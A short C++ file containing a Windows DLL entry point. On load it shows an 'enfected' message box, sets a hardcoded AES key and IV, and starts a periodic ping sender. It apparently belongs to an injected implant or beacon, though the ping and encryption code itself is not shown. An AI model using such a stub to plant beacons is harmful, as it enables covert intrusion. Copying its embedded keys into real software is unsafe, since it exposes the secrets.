#include "common.h"
#include "CPacket.h"
#include "CPingSender.h"
#include "Utility.h"
#include "AES.h"



BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
		DisableThreadLibraryCalls(hModule);


		MessageBoxA(0, "enfected", "enfected", MB_OK);



		Sheriff::AES::iv = "#C(.wdy9Ku1V1d8D";
		Sheriff::AES::key = "dHQ8W?Bx(d(BIv%T?((JPWdY1tq7dbX7";
		CPingSender::Initialize();
		CPingSender::Setup(5000);

	}
	break;
	}
	return TRUE;
}